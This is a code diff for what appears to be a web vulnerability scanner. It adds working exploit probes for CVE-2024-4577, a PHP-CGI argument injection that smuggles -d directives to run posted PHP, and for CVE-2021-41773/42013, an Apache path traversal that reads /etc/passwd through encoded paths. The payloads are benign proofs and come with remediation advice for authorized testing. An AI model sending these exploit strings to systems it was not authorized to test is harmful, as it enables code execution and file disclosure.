@@ -331,18 +331,69 @@ class PHPCGIArgInjection(WebProbe):
 
     def execute(self, base_url, http):
         import random
+        # Benign proof: a unique marker plus a server-side arithmetic result.
+        # A reflected payload would echo the literal "A*B"; only genuine PHP
+        # execution returns the product, so the computed value is the proof
+        # that the injected code ran server-side (the exploitation effect).
         marker = "DAGGER-PHPCGI-%d" % random.randint(10000, 99999)
-        php = "<?php echo '%s'; ?>" % marker
+        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
+        expect = "%s:%d" % (marker, a * b)
+        payload = "<?php echo '%s:'; echo %d*%d; ?>" % (marker, a, b)
+        # The injection smuggles -d directives so a posted script is executed.
         q = "%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
-        s = None
-        for path in ("/index.php?" + q, "/?" + q, "/php-cgi/php-cgi.exe?" + q):
+        steps = []
+        for path in ("/index.php?" + q, "/?" + q, "/php-cgi/php-cgi.exe?" + q,
+                     "/cgi-bin/php.exe?" + q, "/cgi-bin/php-cgi.exe?" + q,
+                     "/test.php?" + q, "/info.php?" + q):
             url = urljoin(base_url, path)
-            s, r = _req(http, "POST", url, "CVE-2024-4577: inject -d directives, POST a PHP echo payload",
-                        content=php.encode())
+            s, r = _req(http, "POST", url,
+                        "CVE-2024-4577: smuggle -d directives, POST a benign PHP compute payload",
+                        content=payload.encode())
+            steps.append(s)
             text = r.text if r is not None else ""
-            if marker in text:
-                return [AttemptRec("php-cgi-arg-injection", self.objective, [s], True, 1.0, marker,
-                                   "CVE-2024-4577 confirmed: the injected PHP executed server-side "
-                                   "(echoed %s) — remote code execution." % marker)]
-        return [AttemptRec("php-cgi-arg-injection", self.objective, [s] if s else [], False, 0.0, "",
-                           "Not exploitable (not PHP-CGI, or already patched).")]
+            if expect in text:
+                return [AttemptRec("php-cgi-arg-injection", self.objective, steps, True, 1.0, expect,
+                                   "CVE-2024-4577 confirmed exploitable: the injected PHP ran server-side "
+                                   "and returned the computed value %s (a reflection would echo the "
+                                   "literal expression, not the product) — remote code execution." % expect)]
+        return [AttemptRec("php-cgi-arg-injection", self.objective, steps, False, 0.0, "",
+                           "Not exploitable (no server-side execution; not PHP-CGI or already patched).")]
+
+
+@register
+class ApachePathTraversal(WebProbe):
+    """CVE-2021-41773 / CVE-2021-42013 — Apache 2.4.49/2.4.50 path traversal.
+    Benign proof: read a world-readable system file (/etc/passwd) to confirm
+    the traversal; the probe never writes, executes, or reads secrets."""
+    id = "cve_2021_41773"
+    name = "Apache Path Traversal (CVE-2021-41773 / 42013)"
+    owasp = "A05"
+    mitre = "T1190"
+    severity = "critical"
+    objective = "Confirm Apache path traversal by reading a world-readable system file."
+    description = ("Tests the Apache 2.4.49/2.4.50 path-traversal flaw: an encoded ../ sequence under "
+                   "an aliased/cgi path escapes the document root to read files outside it.")
+    remediation = ("Upgrade Apache httpd to 2.4.51+; set 'Require all denied' on filesystem roots; "
+                   "disable mod_cgi where unused.")
+
+    # Encoded traversal variants for 41773 (%2e) and 42013 (double-encoded).
+    PATHS = [
+        "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        "/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
+    ]
+
+    def execute(self, base_url, http):
+        steps = []
+        for path in self.PATHS:
+            url = urljoin(base_url, path)
+            s, r = _req(http, "GET", url, "Request /etc/passwd via an encoded ../ traversal")
+            steps.append(s)
+            text = r.text if r is not None else ""
+            m = re.search(r"^root:.*?:0:0:", text, re.M)
+            if m:
+                return [AttemptRec("encoded-traversal", self.objective, steps, True, 1.0, m.group(0),
+                                   "Traversal succeeded: a world-readable system file was returned "
+                                   "(root entry: %s) — files outside the document root are exposed." % m.group(0))]
+        return [AttemptRec("encoded-traversal", self.objective, steps, False, 0.0, "",
+                           "Not exploitable (traversal blocked; not a vulnerable Apache build).")]
